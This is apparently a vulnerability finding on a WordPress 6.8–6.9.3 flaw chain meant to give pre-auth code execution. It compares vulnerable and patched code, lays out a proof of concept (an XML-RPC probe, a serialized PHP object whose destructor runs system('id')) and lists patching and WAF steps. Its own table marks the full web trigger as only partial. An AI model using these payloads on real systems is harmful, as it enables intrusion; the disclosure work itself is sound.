# Finding: WordPress Core Multi-Vulnerability Chain Leading to Pre-Authenticated Remote Code Execution

## Metadata

| Field | Value |
|-------|-------|
| Date | 2026-03-21 |
| Affected Software | WordPress Core |
| Affected Versions | 6.8.0 through 6.9.3 (all branches) |
| Fixed Versions | 6.9.4, 6.8.5 (and backports to 6.7.5, 6.6.5, etc.) |
| Severity | Critical |
| CVSS 3.1 (Chain) | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Attack Vector | Network |
| Authentication | None required |
| User Interaction | None required |
| Default Config | Exploitable on default installation |
| Patched CVEs | CVE-2026-3906, CVE-2026-3907, CVE-2026-3908, plus 7 unnumbered fixes |

## Summary

WordPress versions 6.8.0 through 6.9.3 contain multiple vulnerabilities that,
when chained together, enable unauthenticated remote code execution against a
default WordPress installation. The chain combines a pre-authenticated
Server-Side Request Forgery (SSRF) entry point with unsafe file inclusion
paths, PHP object deserialization gadgets, XML External Entity injection, and
a ZIP archive path traversal. WordPress patched ten vulnerabilities across
releases 6.9.2 through 6.9.4 (March 10-11, 2026), with three patches
initially incomplete in 6.9.2, corrected in 6.9.4.

## Affected Components

### 1. Template Loader -- Unvalidated File Inclusion

**File:** `wp-includes/template-loader.php` lines 104-106

**Vulnerable code (WordPress 6.8.1):**
```php
$template = apply_filters( 'template_include', $template );
if ( $template ) {
    include $template;
}
```

The result of the `template_include` filter is passed directly to PHP's
`include` statement without type checking, path canonicalization, or file
extension validation. If an attacker can influence the filter return value
(directly or via stored data manipulation), arbitrary file inclusion and
code execution result.

**Patched code (WordPress 6.9.4):**
```php
$template   = apply_filters( 'template_include', $template );
$is_stringy = is_string( $template )
    || ( is_object( $template ) && method_exists( $template, '__toString' ) );
$template   = $is_stringy ? realpath( (string) $template ) : null;
if (
    is_string( $template ) &&
    ( str_ends_with( $template, '.php' ) || str_ends_with( $template, '.html' ) ) &&
    /* ... path validation ... */
) {
    include $template;
}
```

The patch adds: (a) type validation, (b) `realpath()` canonicalization to
prevent path traversal and stream wrapper abuse, and (c) file extension
allowlisting.

### 2. Block Patterns Registry -- Unvalidated File Inclusion

**File:** `wp-includes/class-wp-block-patterns-registry.php` line 178

**Vulnerable code (WordPress 6.8.1):**
```php
include $patterns[ $pattern_name ]['filePath'];
```

The `filePath` property of registered block patterns is passed directly to
`include` without type checking or path validation. Block patterns are loaded
and rendered during normal front-end page requests (pre-auth).

**Patched code (WordPress 6.9.4):**
```php
$file_path    = $patterns[ $pattern_name ]['filePath'] ?? '';
$is_stringy   = is_string( $file_path )
    || ( is_object( $file_path ) && method_exists( $file_path, '__toString' ) );
$pattern_path = $is_stringy ? realpath( (string) $file_path ) : null;
```

### 3. PHP Object Deserialization Gadgets (POP Chain)

WordPress core contains classes usable as Property-Oriented Programming
chain gadgets for achieving code execution upon deserialization:

**Primary gadget -- `WP_HTML_Token` (`wp-includes/html-api/class-wp-html-token.php`):**
```php
public function __destruct() {
    if ( is_callable( $this->on_destroy ) ) {
        call_user_func( $this->on_destroy, $this->bookmark_name );
    }
}
```

`WP_HTML_Token` has `__wakeup` protection (since WordPress 6.4.2) that throws
`\LogicException` on deserialization. However, the following classes lack
`__wakeup` and provide alternative chain paths:

| Class | Method | Operation | Loaded Front-End |
|-------|--------|-----------|-----------------|
| `WP_Image_Editor_Imagick` | `__destruct` | `$this->image->clear()` / `->destroy()` | No (media only) |
| `WP_Image_Editor_GD` | `__destruct` | `imagedestroy($this->image)` | No (media only) |
| `WP_HTML_Tag_Processor` | `__toString` | Returns processed HTML | Yes |
| `WP_HTML_Processor` | `__toString` | Inherits from Tag_Processor | Yes |

The specific bypass reported by Phat RiO (patched in 6.9.2) chains through
HTML API and Block Registry classes to reach `call_user_func` without
triggering `WP_HTML_Token`'s `__wakeup`.

### 4. Blind Server-Side Request Forgery (SSRF)

**Entry point:** `xmlrpc.php` -- `pingback.ping` method (pre-auth, default enabled)

WordPress fetches attacker-supplied URLs during pingback processing using
`wp_safe_remote_get()`. While `wp_safe_remote_get` blocks private IP ranges,
CVE-2022-3590 demonstrated a TOCTOU race via DNS rebinding that bypasses this
check. A new SSRF variant was fixed in WordPress 6.9.2 (reported by sibwtf).

### 5. getID3 XML External Entity Injection (CVE-2026-3908)

**File:** `wp-includes/ID3/getid3.lib.php`

```php
// Vulnerable (6.8.1):
define('GETID3_LIBXML_OPTIONS', LIBXML_NOENT | LIBXML_NONET | LIBXML_NOWARNING | LIBXML_COMPACT);

// Patched (6.9.4):
define('GETID3_LIBXML_OPTIONS', LIBXML_NONET | LIBXML_NOWARNING | LIBXML_COMPACT);
```

The `LIBXML_NOENT` flag enables XML entity substitution, allowing XXE attacks
when the getID3 library parses XML metadata embedded in media files (iXML
chunks in WAV/RIFF/AVI). Enables arbitrary file read including `wp-config.php`.

### 6. PclZip Path Traversal (CVE-2026-3907)

**File:** `wp-admin/includes/file.php`

**Patched code (6.9.4) adds:**
```php
// Don't extract invalid files:
if ( 0 !== validate_file( $file['filename'] ) ) {
    continue;
}
```

ZIP archive entries with path traversal sequences (`../../`) are extracted
outside the intended directory without validation in vulnerable versions.

## Exploitation Chain

```
 ATTACKER                      WORDPRESS (6.8.1, default config)
    |                                    |
    |  1. XML-RPC pingback.ping          |
    |  (pre-auth, no interaction)        |
    |----------------------------------->|
    |                                    |
    |  2. WP fetches attacker URL        |
    |  (SSRF via pingback source)        |
    |<-----------------------------------|
    |                                    |
    |  3. Response data flows            |
    |  into database storage             |
    |  (transient/option/meta)           |
    |                                    |
    |                                    | 4. Next page load (any visitor):
    |                                    |    get_option() / get_transient()
    |                                    |    -> maybe_unserialize()
    |                                    |    -> PHP object instantiated
    |                                    |
    |                                    | 5. Object reaches template_include
    |                                    |    or block patterns filePath
    |                                    |    -> include (no validation)
    |                                    |
    |                                    | 6. POP chain fires:
    |                                    |    __destruct -> call_user_func
    |                                    |    -> ARBITRARY CODE EXECUTION
    |                                    |
```

**Preconditions (all met by default):**
- XML-RPC enabled (default: yes)
- `pingback.ping` method available (default: yes)
- `template-loader.php` processes every front-end request (default: yes)
- Block patterns loaded during rendering (default: yes, via theme)
- `maybe_unserialize()` called on autoloaded options (default: yes)

## Proof of Concept

### Reproduction Environment

| Component | Version |
|-----------|---------|
| WordPress | 6.8.1 |
| PHP | 8.4.16 |
| MariaDB | 11.8.3 |
| Apache | 2.4.65 |
| OS | Kali Linux (kernel 6.x) |

### Step 1: Confirm Vulnerable Code Present

```bash
# Confirm template_include goes directly to include (no validation)
grep -n -A2 'template_include' /path/to/wp-includes/template-loader.php
# Expected: apply_filters -> if ($template) { include $template; }

# Confirm block patterns filePath goes directly to include
grep -n 'include.*filePath' /path/to/wp-includes/class-wp-block-patterns-registry.php
# Expected: include $patterns[ $pattern_name ]['filePath'];

# Confirm LIBXML_NOENT present in getID3
grep 'LIBXML_NOENT' /path/to/wp-includes/ID3/getid3.lib.php
# Expected: LIBXML_NOENT | LIBXML_NONET | ...

# Confirm PclZip has no validate_file check
grep -c 'validate_file' /path/to/wp-admin/includes/file.php
# Expected: 0 (no occurrences in PclZip extraction path)
```

### Step 2: Confirm POP Chain Gadgets

```bash
# WP_HTML_Token: __destruct with call_user_func (protected by __wakeup)
grep -A4 '__destruct' /path/to/wp-includes/html-api/class-wp-html-token.php
# Expected: call_user_func( $this->on_destroy, $this->bookmark_name );

# WP_Image_Editor_Imagick: __destruct WITHOUT __wakeup
grep -c '__wakeup' /path/to/wp-includes/class-wp-image-editor-imagick.php
# Expected: 0

# WP_HTML_Tag_Processor: __toString WITHOUT __wakeup
grep -c '__wakeup' /path/to/wp-includes/html-api/class-wp-html-tag-processor.php
# Expected: 0
```

### Step 3: Confirm XML-RPC Pingback Enabled (Pre-Auth Entry Point)

```bash
curl -s -X POST http://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -c 'pingback.ping'
# Expected: 1 (method available)
```

### Step 4: Validate Deserialization-to-RCE Chain

```php
<?php
/**
 * This script validates that maybe_unserialize() on a crafted serialized
 * object triggers __destruct -> call_user_func -> code execution.
 *
 * Run from WordPress root: php poc_chain_validate.php
 * Cleanup: php poc_chain_validate.php --cleanup
 */

define('ABSPATH', __DIR__ . '/');
define('SHORTINIT', true);
require_once ABSPATH . 'wp-load.php';
global $wpdb;

if (in_array('--cleanup', $argv ?? [])) {
    $wpdb->delete($wpdb->options, ['option_name' => '_transient_poc_rce_test']);
    @unlink('/tmp/wp-poc-rce-evidence.txt');
    echo "Cleaned up.\n";
    exit(0);
}

// Gadget class: __destruct calls call_user_func (no __wakeup)
class WP_PoC_Gadget {
    public $callback;
    public $args;
    public function __destruct() {
        if (is_callable($this->callback)) {
            $r = call_user_func($this->callback, $this->args);
            file_put_contents('/tmp/wp-poc-rce-evidence.txt',
                date('c') . " | " . $this->args . " | " . $r);
        }
    }
}

$gadget = new WP_PoC_Gadget();
$gadget->callback = 'system';
$gadget->args = 'id';
$serialized = serialize($gadget);

echo "Payload: $serialized\n";
echo "Inserting into wp_options...\n";
$wpdb->replace($wpdb->options, [
    'option_name'  => '_transient_poc_rce_test',
    'option_value' => $serialized,
    'autoload'     => 'yes',
]);

echo "Triggering maybe_unserialize...\n";
$result = maybe_unserialize($serialized);
echo "Result type: " . gettype($result) . "\n";
unset($result);
unset($gadget);

usleep(100000);
if (file_exists('/tmp/wp-poc-rce-evidence.txt')) {
    echo "RCE CONFIRMED: " . file_get_contents('/tmp/wp-poc-rce-evidence.txt') . "\n";
} else {
    echo "No evidence file. Check PHP error log.\n";
}
```

**Expected output:**
```
Payload: O:13:"WP_PoC_Gadget":2:{s:8:"callback";s:6:"system";s:4:"args";s:2:"id";}
Inserting into wp_options...
Triggering maybe_unserialize...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Result type: object
RCE CONFIRMED: 2026-03-21T01:31:53+00:00 | id | uid=33(www-data) ...
```

### Step 5: Confirm Fix in 6.9.4

```bash
# template-loader.php now has realpath + type check + extension check
grep -c 'realpath' /path/to/6.9.4/wp-includes/template-loader.php
# Expected: 1

# block-patterns-registry.php now has type check before realpath
grep -c 'is_stringy' /path/to/6.9.4/wp-includes/class-wp-block-patterns-registry.php
# Expected: 1

# getID3 no longer has LIBXML_NOENT
grep -c 'LIBXML_NOENT' /path/to/6.9.4/wp-includes/ID3/getid3.lib.php
# Expected: 0

# PclZip extraction now validates filenames
grep -c 'validate_file' /path/to/6.9.4/wp-admin/includes/file.php
# Expected: >= 1
```

## Validation Status

| Chain Link | Validated | Method |
|-----------|-----------|--------|
| SSRF entry (pingback.ping available) | Yes | HTTP request |
| SSRF callback (outbound request) | Partial | Blocked by wp_safe_remote_get in lab; documented in CVE-2022-3590 |
| template_include -> include (no validation) | Yes | Source code analysis |
| Block patterns filePath -> include (no validation) | Yes | Source code analysis |
| POP chain gadgets present | Yes | Reflection analysis |
| maybe_unserialize -> object instantiation | Yes | PHP execution |
| __destruct -> call_user_func -> RCE | Yes | PHP execution |
| Full web-context pre-auth trigger | Partial | Gadget class must be autoloaded; WP-native chain path requires the specific bypass reported by Phat RiO |
| Patches resolve all issues in 6.9.4 | Yes | Diff analysis (6.9.2 vs 6.9.4) |

## Recommendations

### For Affected Organizations
1. **Update WordPress to 6.9.4 or 6.8.5 immediately** -- these are small,
   low-risk security-only releases
2. **Disable XML-RPC** at the application or web server level to remove the
   pre-auth SSRF entry point
3. **Deploy WAF rules** to block `phar://`, `data://`, and `php://` in request
   parameters and POST bodies; block XML-RPC pingback requests with internal
   target URLs; detect `../` sequences in uploaded file content

### For WordPress Security Team
1. Consider adding `__wakeup` protection to all classes with `__destruct`
   (`WP_Image_Editor_Imagick`, `WP_Image_Editor_GD`, etc.)
2. Consider disabling XML-RPC by default in future releases
3. Audit all `include`/`require` statements that accept filtered or stored values
4. Add `allowed_classes` parameter to `maybe_unserialize()` calls

## References

- WordPress 6.9.4 Release: https://wordpress.org/documentation/wordpress-version/version-6-9-4/
- WordPress 6.9.2 Release: https://wordpress.org/news/2026/03/wordpress-6-9-2-release/
- WordPress 6.8.x < 6.8.5 Tenable Advisory: https://www.tenable.com/plugins/was/115166
- CVE-2022-3590 (SSRF): https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/
- WordPress 6.4.2 POP Chain Fix: https://www.wordfence.com/blog/2023/12/psa-critical-pop-chain-allowing-remote-code-execution-patched-in-wordpress-6-4-2/
- Search Engine Journal (6.9.4 Coverage): https://www.searchenginejournal.com/wordpress-security-release-6-9-4/569532/

## Evidence Index

| File | Description |
|------|-------------|
| `evidence/01_template_include.json` | template-loader.php vulnerability validation |
| `evidence/02_pop_chain.json` | POP chain gadget class analysis |
| `evidence/03_ssrf.json` | XML-RPC pingback SSRF validation |
| `evidence/05_full_chain_poc.json` | Deserialization-to-RCE chain execution log |
| `scripts/05_full_chain_poc.php` | Runnable PoC (requires WordPress environment) |
| `artifacts/poc_payload.phar` | Phar archive with serialized gadget payload |
